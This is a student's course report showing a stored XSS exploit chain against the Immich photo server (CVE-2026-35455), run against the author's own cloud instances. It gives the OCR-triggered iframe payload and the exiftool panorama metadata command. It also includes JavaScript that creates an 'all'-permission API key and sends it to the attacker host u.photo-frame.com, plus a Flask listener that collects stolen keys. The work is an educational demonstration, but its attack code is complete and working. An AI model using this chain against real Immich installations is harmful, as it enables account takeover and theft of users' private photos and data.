# Immich exfiltration demo
This report describes how I exploited CVE-2026-35455 to achieve account hijacking and persistent unauthorized access to an Immich self-hosted instance.
All the files used are published in [this repo](https://github.com/emanuelepns/immich-exfiltration-demo).
A [video](https://peertube.uno/w/hAoadPGNe2vELWbVcdTwUV) of the execution is also available.
# Introduction
Immich is a self-hosted photo and video management solution that you can easily deploy on your own server. I have been using it regularly for a year, and on May 2026 while looking for some ideas for a demo for the Cybersecurity exam, I found this interesting vulnerability.
The [CVE-2026-35455](https://github.com/immich-app/immich/security/advisories/GHSA-9qx4-67jm-cc66) allows an attacker to execute arbitrary JavaScript code extracted by OCR from an image. You can find a more detailed description [here](https://aisafe.io/blog/cve-2026-35455-immich-stored-xss-panorama-ocr). 
What made me curious is that the malicious initial payload is an image, in particular the text in that image. The file itself doesn't look suspicious and doesn't trigger any antivirus or malware alerts (verified on [VirusTotal](https://www.virustotal.com/gui/file/2da60eb54d179758a8ba453be43677beeb0327934f874e1eb3354979f4709a9a)). 
The objective of this demo was suggested by the security advisory, which states *"session hijacking (via persistent API key creation)"*. After trying the exploit with the provided [test image](https://github.com/emanuelepns/immich-exfiltration-demo/blob/main/images/test.jpg), I built my idea: edit an image by adding a text that triggers a script loaded from an external source, which scope is to create and exfiltrate an API key; then I could use that key to interact with [Immich APIs](https://api.immich.app/), gaining full control of the app.
# Setup
Before diving into the actual execution, let's take a look at the environment configuration. My goal is to show the infrastructure used rather than giving a line-by-line command list, demonstrating how I replicated a realistic, cloud-based scenario instead of a simple local simulation.
## Infrastructure
As server I deployed two separate instances on Oracle Cloud (using the [Free Tier](https://www.oracle.com/it/cloud/free/)):
- **Victim instance**: hosts Immich app;
- **Attacker instance**: hosts the malicious script and catches the exfiltrated api key.

Both were set up with a [minimal version](https://wiki.ubuntu.com/Minimal) of Ubuntu 24.04.4 LTS.
For the domains, I decided to use a dedicated subdomain under my personal domain for the victim machine (immich.mnlpns.it), and a free subdomain obtained via [FreeDNS](https://freedns.afraid.org/) for the attacker (u.photo-frame.com).

To ensure a production-like setup, I installed [Caddy](https://caddyserver.com/) as a reverse proxy on both machines as it manages the SSL certificates automatically with just a two line configuration. This step was crucial because unencrypted HTTP traffic is often rejected or restricted, making a valid HTTPS setup necessary for the exploit chain to succeed seamlessly.
## Immich setup
The victim environment was deployed following the official [Docker Compose install guide](https://docs.immich.app/install/docker-compose/) (files attached in my repo). To ensure the assessment remained as close as possible to an out-of-the-box installation, I left unaltered the configuration with only two exceptions in environment variables:
1. Application version was pinned to the vulnerable release `v2.6.3`;
2. Database password was changed as recommended.

During the initial onboarding, Immich requires the creation of a primary user account, which is automatically granted full administrative privileges, as stated in the little box you can see in the following image.

![](attachments/Pasted%20image%2020260520190228.png)

While this streamlines the initial setup process, in my opinion it introduces a flaw regarding the Principle of Least Privilege: administrative accounts should strictly be used for infrastructure management while daily activities should be performed by unprivileged users. The setup documentation and wizard fail to inform the user about the security implications of this, and usually who installs this kind of self-hosted software frequently follows a "line-by-line" guide without knowing what they are doing nor the underlying risks.
# Execution
## Malicious image
The first thing to do was to create the initial payload. The vulnerability resides in the application's panorama photo viewer, so an asset that triggers it is needed. The image requires:
1. High-resolution, wide-aspect-ratio;
2. EXIF [`GPano`](https://developers.google.com/streetview/spherical-metadata?hl=it) metadata tags.

To built it I sourced a photo from [Unsplash](https://unsplash.com/it) and then edited using [GIMP](https://www.gimp.org/). A real attacker would have hided the text better, for example inserting it in a road sign, or looking for the OCR contrast limits, but this is just a demo, so I added a text in a clear area, hiding the following code inside a fake link:
```html
<iframe srcdoc="<script src='https://u.photo-frame.com/tomas.js'></script>">
```
I put some `/` to avoid leaving spaces, that could break the OCR or give suspects, as they are accepted as separators by browsers as well.
After exporting it I added the metadata, using [ExifTool](https://exiftool.org/), with the command
```bash
$ exiftool \
  -XMP-gpano:ProjectionType="equirectangular" \
  -XMP-gpano:UsePanoramaViewer="True" \
  -XMP-gpano:FullPanoWidthPixels=12000 \
  -XMP-gpano:FullPanoHeightPixels=6000 \
  -XMP-gpano:CroppedAreaImageWidthPixels=12000 \
  -XMP-gpano:CroppedAreaImageHeightPixels=6000 \
  -XMP-gpano:CroppedAreaLeftPixels=0 \
  -XMP-gpano:CroppedAreaTopPixels=0 \
  tomas-cocacola-4AxeQEi0gQc-unsplash.jpg
```
At this point the [file](https://github.com/emanuelepns/immich-exfiltration-demo/blob/main/images/tomas-cocacola-4AxeQEi0gQc-unsplash.jpg) is ready to be uploaded in the Immich library and tested: it correctly opens in the panorama viewer and after triggering the OCR overlay (the `T` button in the bottom right corner) the `iframe` in the previous code is correctly rendered (you can look at it inspecting the page).

![](attachments/Pasted%20image%2020260520205010.png)
## Malicious Script
 With the working exploit established, I proceeded to code the malicious script. After trying a simple `alert(1)` to verify the correct JavaScript execution, I took a look at official API documentation, in particular the [API keys management endpoint](https://api.immich.app/endpoints/api-keys). To create a new key you need to do a simple POST request with two parameters: name and list of permissions.
 So I chose a good unsuspicious name and constructed the following request:
 ```js
const response = await fetch('/api/api-keys', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	body: JSON.stringify({ name: 'Mobile App',
						   permissions: ["all"]}) 
});
const data = await response.json();
 ```
 As the script executes within the context of the user's active session, the request is automatically authenticated and masqueraded as it is coming from the real user, without giving any errors. The response contains the key itself (the secret) along with an [object](https://api.immich.app/models/APIKeyResponseDto) containing secondary details (e.g. an unique ID). We don't need all of this, the actual key is sufficient to interact with APIs.
The exfiltration at this point can be easily achieved with a simple GET request to the attacker's HTTP server:
```js
fetch('https://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document.domain, { mode: 'no-cors' });
```
I added the `document.domain` parameter, because in a real world scenario the attacker doesn't know where his script hit, and having the target domain is essential to map the key to its respective host. Another addition is the `no-cors` mode, that allows to send the request without requiring a response, effectively preventing the browser from blocking the outbound traffic due to [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) policies.
You can find the final script in the repository. To further mitigate suspicion I renamed it after the photographer of the original image.
Now we have in our hands powerful credentials, we just set the permissions to "all", so the attacker can bypass all standard authentication challenges and gain full data access or even administrative control based on the victim privileges.
## Attacker's server
The last thing to do was orchestrating the attack, using a Command and Control infrastructure with two main capabilities: 
1) hosting the malicious script to be fetched by the exploit;
2) exposing an endpoint to capture and store the exfiltrated API keys.

> I'm not a Python experienced programmer, the following code was developed with the help of LLMs and carefully reading the documentation.

In the initial testing phase, I used a minimalist approach, so the malicious script was hosted using Python via the following command (executed in its folder):
```bash
$ python3 -m http.server 8080
```
This was sufficient to host the file and view incoming HTTP requests directly in the terminal, but it lacked structural persistence. The exfiltrated keys only appeared in the raw query strings of the server logs, making them difficult to parse, organize, and store securely for long-term exploitation.

To implement a better infrastructure I decided to use a custom Python program using the [Flask](https://flask.palletsprojects.com/en/stable/) framework, as it seemed the quickest and easier way to get up and running without getting crazy. It has a clear code structure, that reminds me of classical functions.
You need to create a virtual environment to use it, but I will skip this steps as you can simply read the [installation guide](https://flask.palletsprojects.com/en/stable/installation/).
The application I built is made up of two main components: one endpoint for serving the script, the other for managing exfiltration.
The first routing endpoint handles the initial delivery phase, safely serving the payload from an isolated static directory. It is simple achieved with this three lines:
```python
@app.route("/tomas.js")
def serve_script():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'tomas.js')
```
The second endpoint acts as a listener for the exfiltration phase, extracting the raw key and domain URL parameters sent by the victim's browser via the GET request:
```python
@app.route("/log")
def apikey_exfiltration():
    key = request.args.get('key', 'NO_KEY')
    domain = request.args.get('domain', 'NO_DOMAIN')
[...]
```
Then, to store the keys, the program generates an unique timestamp for each incoming request and maps the data into a clean dictionary structure ready to export to a JSON file inside a dedicated logs directory:
```python
[...]
    data = {
        "timestamp": datetime.now().strftime('%Y%m%d_%H%M%S'),
        "domain": domain,
        "key": key
    }

    file_name = "log_" + time + ".json"
    file_path = os.path.join('logs', file_name)

    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

    return "OK"
```
To start the server you just need to run the command `$ flask --app server run -p 8080` inside your virtual environment. As stated in the message shown in the shell, this is just a development server not meant for production, but for this demo is sufficient.

![](attachments/Pasted%20image%2020260522133824.png)

You can see the incoming requests logged on screen, for the script first and for the exfiltration then. The program correctly extracts and saves the keys in an output JSON file.

![](attachments/Pasted%20image%2020260522134101.png)

## Using the key
With the keys stored in simple JSON files, the attacker could easily automate data exfiltration. I'm not a professional attacker, and my objective is already reached, so I will just show you some examples to show that the API key is working. To do so in a simple way I choose to move on from `curl` and use [HTTPie](https://httpie.io/), a program that simplifies APIs interaction meant for developers. 
The usage is pretty simple, e.g. for a GET:
```bash
$ http GET https://immich.mnlpns.it/api/endpoint x-api-key:[API-KEY]
```
There are endpoints for almost everything you can do on the server as the user, as retrieving the list of assets, creating albums, sharing things, downloading the library and, if the account is also an admin you can edit configs, download or upload the database. You can have full access of the application! 
In the following screenshots you can see how to get a list of users and their details, and then how to send a notification to one of them.

![](attachments/Pasted%20image%2020260522144459.png)

![](attachments/Pasted%20image%2020260522144601.png)
![](attachments/Pasted%20image%2020260522144715.png)


---
[Emanuele Pines](https://mnlpns.it) - Cybersecurity Course - A.Y. 2025/2026 - University Of Trieste